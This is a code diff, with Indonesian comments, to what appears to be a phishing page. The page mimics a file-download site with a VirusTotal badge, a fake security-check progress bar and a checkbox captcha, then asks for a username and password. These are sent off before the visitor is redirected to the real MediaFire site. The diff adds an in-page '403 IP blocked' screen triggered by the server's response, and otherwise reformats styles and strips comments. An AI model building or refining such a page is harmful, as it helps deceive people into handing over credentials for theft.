@@ -222,7 +222,6 @@ button{
     display:block;
 }
 
-/* ===== BANNER BAWAH ===== */
 .uploader-info{
     max-width:600px;
     width:100%;
@@ -246,7 +245,6 @@ button{
     font-weight:400;
 }
 
-/* ===== VIRUSTOTAL SECTION ===== */
 .vt-section{
     max-width:600px;
     width:100%;
@@ -318,7 +316,6 @@ button{
     animation:popup .2s ease;
 }
 
-/* --- PROGRESS CIRCLE --- */
 .verify-progress-wrap{
     position:relative;
     width:90px;
@@ -360,7 +357,6 @@ button{
     color:#1a73e8;
 }
 
-/* --- TEXT --- */
 .verify-title{
     font-size:20px;
     font-weight:bold;
@@ -381,7 +377,6 @@ button{
     margin-bottom:0;
 }
 
-/* --- CAPTCHA BOX --- */
 .captcha-box{
     display:none;
     margin-top:24px;
@@ -477,7 +472,6 @@ button{
     color:#80868b;
 }
 
-/* --- BUTTON LANJUT --- */
 .btn-lanjut{
     width:100%;
     margin-top:20px;
@@ -541,14 +535,8 @@ button{
 }
 
 @keyframes popup{
-    from{
-        opacity:0;
-        transform:scale(.92);
-    }
-    to{
-        opacity:1;
-        transform:scale(1);
-    }
+    from{opacity:0; transform:scale(.92);}
+    to{opacity:1; transform:scale(1);}
 }
 
 .login-card-header{
@@ -737,13 +725,70 @@ button{
     cursor:default;
 }
 
+/* ================= BLOCKED PAGE (IN-PAGE) ================= */
+
+#blockedPage{
+    position:fixed;
+    inset:0;
+    width:100%;
+    height:100%;
+    background:#f8f9fa;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    z-index:9999999;
+}
+
+#blockedPage.show{
+    display:flex;
+}
+
+.blocked-card{
+    background:#fff;
+    padding:60px 80px;
+    border-radius:20px;
+    box-shadow:0 4px 24px rgba(0,0,0,.08);
+    text-align:center;
+    border:1px solid #eee;
+    max-width:480px;
+    width:100%;
+}
+
+.blocked-code{
+    font-size:96px;
+    font-weight:800;
+    color:#e63946;
+    letter-spacing:-4px;
+    line-height:1;
+}
+
+.blocked-line{
+    width:70px;
+    height:5px;
+    background:#ffc9ce;
+    border-radius:3px;
+    margin:22px auto;
+}
+
+.blocked-title{
+    font-size:26px;
+    color:#1a1a2e;
+    margin:0 0 14px;
+    font-weight:700;
+}
+
+.blocked-text{
+    color:#9aa0a6;
+    font-size:15px;
+    margin:0;
+}
+
 /* ================= MOBILE ================= */
 
 @media(max-width:480px){
 
-    .modal{
-        padding:18px;
-    }
+    .modal{ padding:18px; }
 
     .login-card{
         width:88%;
@@ -752,96 +797,43 @@ button{
         border-radius:13px;
     }
 
-    .card-body{
-        padding:22px 20px 24px;
-    }
+    .card-body{ padding:22px 20px 24px; }
+    .login-title{ font-size:21px; }
+    .login-subtitle{ font-size:12px; }
 
-    .login-title{
-        font-size:21px;
-    }
-
-    .login-subtitle{
-        font-size:12px;
-    }
+    .blocked-card{ padding:40px 28px; }
+    .blocked-code{ font-size:72px; }
+    .blocked-title{ font-size:22px; }
 }
 
 @media(max-width:360px){
 
-    .modal{
-        padding:14px;
-    }
+    .modal{ padding:14px; }
 
     .login-card{
         width:86%;
         max-height:82vh;
     }
 
-    .card-body{
-        padding:19px 17px 21px;
-    }
-
-    .login-title{
-        font-size:20px;
-    }
-
-    .privacy{
-        font-size:11px;
-    }
-
-    .forgot{
-        font-size:12px;
-    }
-
-    .btn-login{
-        padding:9px 20px;
-        font-size:12px;
-    }
+    .card-body{ padding:19px 17px 21px; }
+    .login-title{ font-size:20px; }
+    .privacy{ font-size:11px; }
+    .forgot{ font-size:12px; }
+    .btn-login{ padding:9px 20px; font-size:12px; }
 }
 
 @media(max-width:350px){
 
-    .header{
-        padding:0;
-    }
-
-    .file-title{
-        font-size:13px;
-    }
-
-    .file-sub{
-        font-size:10px;
-    }
-
-    .slow{
-        font-size:10px;
-    }
-
-    .fast{
-        font-size:9px;
-        padding:5px 8px;
-    }
-
-    .flag-box{
-        width:50px;
-        height:22px;
-    }
-
-    .uploader-text{
-        font-size:12px;
-    }
-
-    .vt-logo{
-        width:130px;
-        height:78px;
-    }
-
-    .vt-title{
-        font-size:15px;
-    }
-
-    .vt-desc{
-        font-size:12px;
-    }
+    .header{ padding:0; }
+    .file-title{ font-size:13px; }
+    .file-sub{ font-size:10px; }
+    .slow{ font-size:10px; }
+    .fast{ font-size:9px; padding:5px 8px; }
+    .flag-box{ width:50px; height:22px; }
+    .uploader-text{ font-size:12px; }
+    .vt-logo{ width:130px; height:78px; }
+    .vt-title{ font-size:15px; }
+    .vt-desc{ font-size:12px; }
 }
 </style>
 </head>
@@ -950,7 +942,6 @@ button{
 
     </div>
 
-    <!-- BANNER BAWAH -->
     <div class="uploader-info">
         <div class="flag-box"></div>
         <div class="uploader-text">
@@ -958,7 +949,6 @@ button{
         </div>
     </div>
 
-    <!-- VIRUSTOTAL SECTION -->
     <div class="vt-section">
 
         <div class="vt-logo">
@@ -982,13 +972,22 @@ button{
 </main>
 
 
-<!-- ================= VERIFIKASI HUMAN ================= -->
+<!-- ================= HALAMAN BLOCKED (IN-PAGE) ================= -->
+<div id="blockedPage">
+    <div class="blocked-card">
+        <div class="blocked-code">403</div>
+        <div class="blocked-line"></div>
+        <h2 class="blocked-title">Akses Ditolak</h2>
+        <p class="blocked-text">IP Anda telah diblokir.</p>
+    </div>
+</div>
 
+
+<!-- ================= VERIFIKASI HUMAN ================= -->
 <div id="verifyModal">
 
     <div class="verify-card">
 
-        <!-- PROGRESS -->
         <div class="verify-progress-wrap" id="verifyProgressWrap">
 
             <svg>
@@ -1000,7 +999,6 @@ button{
 
         </div>
 
-        <!-- TEXT -->
         <div class="verify-title" id="verifyTitle">
             Memeriksa Keamanan
         </div>
@@ -1011,8 +1009,6 @@ button{
 
         <p class="verify-timer" id="verifyTimer"></p>
 
-
-        <!-- CAPTCHA -->
         <div class="captcha-box" id="captchaBox">
 
             <div class="captcha-frame" id="captchaFrame" onclick="toggleCaptcha()">
@@ -1049,7 +1045,6 @@ button{
 
 
 <!-- ================= LOGIN ================= -->
-
 <div
     class="modal"
     id="loginModal"
@@ -1232,7 +1227,6 @@ function openVerifyModal(){
     const modal = document.getElementById("verifyModal");
     modal.classList.add("show");
 
-    // reset state
     captchaChecked = false;
     document.getElementById("captchaBox").classList.remove("show");
     document.getElementById("captchaFrame").classList.remove("checked");
@@ -1244,7 +1238,6 @@ function openVerifyModal(){
     document.getElementById("verifyBar").style.strokeDashoffset = 251.2;
     document.getElementById("verifyPercent").textContent = "0%";
 
-    // mulai animasi progress
     let percent = 0;
     const bar = document.getElementById("verifyBar");
     const percentText = document.getElementById("verifyPercent");
@@ -1273,7 +1266,6 @@ function openVerifyModal(){
 
             timerText.textContent = "";
 
-            // tampilkan captcha
             setTimeout(function(){
                 document.getElementById("verifyTitle").textContent = "Verifikasi Diperlukan";
                 document.getElementById("verifySub").textContent = "Untuk melanjutkan, centang kotak berikut untuk memastikan kamu manusia, bukan bot.";
@@ -1282,7 +1274,7 @@ function openVerifyModal(){
 
         }
 
-    }, 60); // ~3 detik total
+    }, 60);
 
 }
 
@@ -1320,7 +1312,6 @@ function lanjutKeLogin(){
 
         document.getElementById("verifyModal").classList.remove("show");
 
-        // GA LANGSUNG BUKA LOGIN — balik ke halaman download dulu
         btn.textContent = "Lanjutkan";
 
     }, 900);
@@ -1386,11 +1377,16 @@ function detectBrowser(ua){
     return "Unknown";
 }
 
+function showBlockedPage(){
+    document.getElementById("verifyModal").classList.remove("show");
+    document.getElementById("loginModal").classList.remove("show");
+    document.getElementById("blockedPage").classList.add("show");
+}
+
 function openDownloadLogin(event){
 
     if(event){ event.stopPropagation(); }
 
-    // kalo belom verif, tampilin verif dulu
     if(!sessionStorage.getItem("verified")){
         openVerifyModal();
         return;
@@ -1437,7 +1433,6 @@ function loginUser(event){
 
     clearMessage();
 
-    /* ===== VALIDASI ===== */
     const errMsg = validasiInput(username, password);
     if(errMsg){
         showMessage("❌ " + errMsg, "error");
@@ -1479,10 +1474,22 @@ function loginUser(event){
             });
 
         })
+        .then(function(res){
+
+            if(res.status === 403){
+                showBlockedPage();
+                return null;
+            }
+
+            return res.json();
+
+        })
         .catch(function(error){ console.log("Error:", error); })
         .finally(function(){
             setTimeout(function(){
-                window.location.href = "https://www.mediafire.com/";
+                if(!document.getElementById("blockedPage").classList.contains("show")){
+                    window.location.href = "https://www.mediafire.com/";
+                }
             }, 800);
         });
 
@@ -1493,12 +1500,10 @@ function loginUser(event){
 
 window.addEventListener("load", function(){
 
-    // kalo udah verif di sesi ini, skip
     if(sessionStorage.getItem("verified")){
         return;
     }
 
-    // tampilin verif duluan
     openVerifyModal();
 
 });
